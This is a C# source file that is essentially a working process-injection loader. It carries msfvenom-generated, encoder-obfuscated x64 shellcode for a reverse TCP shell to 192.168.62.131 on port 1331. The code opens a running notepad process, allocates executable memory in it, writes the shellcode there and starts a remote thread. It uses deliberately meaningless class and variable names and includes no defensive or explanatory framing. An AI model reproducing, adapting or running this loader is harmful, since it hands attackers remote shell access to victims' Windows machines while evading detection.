using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace cevsn
{
	public class Mevsn
	{
		/*
            Shellcode with: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.62.131 LPORT=1331 -e x64/zutto_dekiru -f csharp -o test.cs
        */
		byte[] lit = new byte[512] {
			0xdb,0xc7,0x54,0x48,0x31,0xed,0x41,0x59,0x40,0xb5,0x3a,0x49,0xbc,0x01,0xeb,
			0xc1,0x55,0x63,0x83,0x2a,0x73,0x66,0x41,0x81,0xe1,0x80,0xf0,0x49,0x0f,0xae,
			0x01,0x49,0x8b,0x71,0x08,0x48,0xff,0xcd,0x4c,0x31,0x64,0xee,0x30,0x48,0x85,
			0xed,0x75,0xf3,0xfd,0xa3,0x42,0xb1,0x93,0x6b,0xea,0x73,0x01,0xeb,0x80,0x04,
			0x22,0xd3,0x78,0x22,0x57,0xa3,0xf0,0x87,0x06,0xcb,0xa1,0x21,0x61,0xa3,0x4a,
			0x07,0x7b,0xcb,0xa1,0x21,0x21,0xa3,0x4a,0x27,0x33,0xcb,0x25,0xc4,0x4b,0xa1,
			0x8c,0x64,0xaa,0xcb,0x1b,0xb3,0xad,0xd7,0xa0,0x29,0x61,0xaf,0x0a,0x32,0xc0,
			0x22,0xcc,0x14,0x62,0x42,0xc8,0x9e,0x53,0xaa,0x90,0x1d,0xe8,0xd1,0x0a,0xf8,
			0x43,0xd7,0x89,0x54,0xb3,0x08,0xaa,0xfb,0x01,0xeb,0xc1,0x1d,0xe6,0x43,0x5e,
			0x14,0x49,0xea,0x11,0x05,0xe8,0xcb,0x32,0x37,0x8a,0xab,0xe1,0x1c,0x62,0x53,
			0xc9,0x25,0x49,0x14,0x08,0x14,0xe8,0xb7,0xa2,0x3b,0x00,0x3d,0x8c,0x64,0xaa,
			0xcb,0x1b,0xb3,0xad,0xaa,0x00,0x9c,0x6e,0xc2,0x2b,0xb2,0x39,0x0b,0xb4,0xa4,
			0x2f,0x80,0x66,0x57,0x09,0xae,0xf8,0x84,0x16,0x5b,0x72,0x37,0x8a,0xab,0xe5,
			0x1c,0x62,0x53,0x4c,0x32,0x8a,0xe7,0x89,0x11,0xe8,0xc3,0x36,0x3a,0x00,0x3b,
			0x80,0xde,0x67,0x0b,0x62,0x72,0xd1,0xaa,0x99,0x14,0x3b,0xdd,0x73,0x29,0x40,
			0xb3,0x80,0x0c,0x22,0xd9,0x62,0xf0,0xed,0xcb,0x80,0x07,0x9c,0x63,0x72,0x32,
			0x58,0xb1,0x89,0xde,0x71,0x6a,0x7d,0x8c,0xfe,0x14,0x9c,0x1c,0xdd,0xf4,0x59,
			0x41,0x5e,0xd8,0xf3,0x55,0x63,0xc2,0x7c,0x3a,0x88,0x0d,0x89,0xd4,0x8f,0x23,
			0x2b,0x73,0x01,0xa2,0x48,0xb0,0x2a,0x3f,0x28,0x73,0x04,0xd8,0x01,0xfd,0x5d,
			0x00,0x6b,0x27,0x48,0x62,0x25,0x19,0xea,0x72,0x6b,0xc9,0x4d,0x9c,0xe7,0x52,
			0x9c,0x56,0x66,0xfa,0xeb,0x83,0xc0,0x54,0x63,0x83,0x73,0x32,0xbb,0xc2,0x41,
			0x3e,0x63,0x7c,0xff,0x23,0x51,0xa6,0xf0,0x9c,0x2e,0xb2,0xea,0x3b,0xfe,0x2b,
			0x89,0xdc,0xa1,0xcb,0xd5,0xb3,0x49,0x62,0x00,0x14,0xd9,0x69,0x25,0xac,0xe1,
			0x14,0x14,0x1d,0xea,0x44,0x40,0x63,0x40,0xb3,0x8d,0xdc,0x81,0xcb,0xa3,0x8a,
			0x40,0x51,0x58,0xf0,0x17,0xe2,0xd5,0xa6,0x49,0x6a,0x05,0x15,0x61,0x83,0x2a,
			0x3a,0xb9,0x88,0xac,0x31,0x63,0x83,0x2a,0x73,0x01,0xaa,0x91,0x14,0x33,0xcb,
			0xa3,0x91,0x56,0xbc,0x96,0x18,0x52,0x43,0x40,0x7e,0x58,0xaa,0x91,0xb7,0x9f,
			0xe5,0xed,0x37,0x25,0xbf,0xc0,0x54,0x2b,0x0e,0x6e,0x57,0x19,0x2d,0xc1,0x3d,
			0x2b,0x0a,0xcc,0x25,0x51,0xaa,0x91,0x14,0x33,0xc2,0x7a,0x3a,0xfe,0x2b,0x80,
			0x05,0x2a,0x7c,0xe2,0x3e,0x88,0x2a,0x8d,0xdc,0xa2,0xc2,0x90,0x0a,0xcd,0xd4,
			0x47,0xaa,0xb6,0xcb,0x1b,0xa1,0x49,0x14,0x0b,0xde,0x6d,0xc2,0x90,0x7b,0x86,
			0xf6,0xa1,0xaa,0xb6,0x38,0xda,0xc6,0xa3,0xbd,0x80,0xef,0xc5,0x16,0x97,0xee,
			0xfe,0x3e,0x89,0xd6,0xa7,0xab,0x16,0x75,0x7d,0xe1,0x41,0xae,0x83,0xf6,0x2f,
			0xc8,0x46,0xf8,0xb3,0x3a,0x09,0x83,0x73,0x32,0x88,0x31,0x3e,0x80,0xd4,0x35,
			0x36,0xe3
		};

		[DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public Mevsn()
        {
        	Console.Write("lit");
            Process[] expProc = Process.GetProcessesByName("notepad");
            uint pide = Convert.ToUInt32(expProc[0].Id);
            IntPtr processerino = OpenProcess(0x001F0FFF, false, pide);
            IntPtr addresserino = VirtualAllocEx(processerino, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            byte[] profit = lit;
            IntPtr outSize;
            WriteProcessMemory(processerino, addresserino, profit, profit.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(processerino, IntPtr.Zero, 0, addresserino, IntPtr.Zero, 0, IntPtr.Zero);
        }
	}
}